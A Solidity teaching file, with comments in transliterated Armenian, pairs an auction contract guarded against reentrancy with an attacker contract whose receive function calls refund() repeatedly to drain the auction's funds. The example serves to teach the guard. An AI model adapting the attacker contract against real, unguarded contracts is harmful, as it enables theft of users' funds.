// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//sovorakan aukcion
contract ReentrancyAuction {
    mapping(address => uint) public bidders; // ov a anum stavka inch poghov
    bool locked; //default false  avelacrel enq pashtpanelu

    //stavka anelu funkcia, amen angam stavka anighi hascen dnum enq mapingi mej, stavki chapov avelacnelov eghac gumary
    function bid() external payable {
        bidders[msg.sender] += msg.value;
    }

// ays modifaery himnakan pashtpanna vory arajin angamaic heto el chi toghnum mtnel, dnum enq refund funkciayi vra
    modifier noReentrancy() { 
        require(!locked, "no reentrancy!"); //arajin ok
        locked = true; //miangamic poxum enq el chi ancni ete daje rekursia lin
        _; // anum enq funkcian refundy es depqum
        locked = false; // u miangamic eli false enq sarqum
    }

    // pull


//SA OpenZEPi-nman mekhanizmov(locked) Pashtpanvac contractI tipik orinak a
// funkcia vor veradardznum a chkrac stavkanery ugharkoghnerin
//inch linum a stegh a linum 
    function refund() external noReentrancy { 
        uint refundAmount = bidders[msg.sender]; // prosto mappingic hanum enq stavki chapy konkret hascei hamar

        if (refundAmount > 0) { //asum enq ete stavka ka
            bidders[msg.sender] = 0; //sranov pashtpanum enq skzbic zroyacnum enq heto poxancum enq u hajord kancheluc arden oya cuyc talis
            (bool success,) = msg.sender.call{value: refundAmount}("");// nizkaurovnevi zapros enq ugharkum minchev hajogh linely, vortegh soobsheni chka ayl miayn gumarn enq poxancum en chapov vor stavk a arel, aranc nshelu poghy stanalu konkret funkcian

            require(success, "failed");  // pahanjum enq vor hajogh lini hakarak depqum asum enq failed

            //bidders[msg.sender] = 0;     // oyacnum enq mappingum tvyal hascei gumary
        }

    }

    function currentBalance() external view returns(uint){
        return address(this).balance;
    }
}

// taky ataki contractna, u qani vor henc smart contractov enq hardzakvum dra hamar el karum enq jardel
contract ReentrancyAttack {
    // karanq owner unanaq
    uint constant BID_AMOUNT = 1 ether; //  stavki chapna
    ReentrancyAuction auction;

    constructor(address _auction) {
        auction = ReentrancyAuction(_auction);
    }

    //stavka anogh funkcia 
    function proxyBid()external payable{ // stanum enq es funkciayov pogh u
        require(msg.value == BID_AMOUNT, "incorect"); // im stavki chapna
        auction.bid{value: msg.value}();    // u peredayem dalshe
    }

// talani funkcia nakhapes pti bid arac linenq vor mappingi mej linenq
    function attack() external {
        auction.refund(); //prosto refund enq uzum
    }
//prosto vor pogh enq yndunum lyuboy aranc funkcia
    receive() external payable {// kara datark el lini
        if(auction.currentBalance() > BID_AMOUNT) // asum em qani auction contraqti vra dranic shat pogh ka ha kanchi refundy u qami poghery minchev verj
        auction.refund(); // ay henc es toghna attack anum, poghy galis a u noric kanchum a refund eli galis eli kanchum a, qani vor chi hasnum refundi mej 0-yacnogh toghin, u anyndhat bidi chapov pogha berum 
    }

    function currentBalance() external view returns(uint){
        return address(this).balance;
    }
}

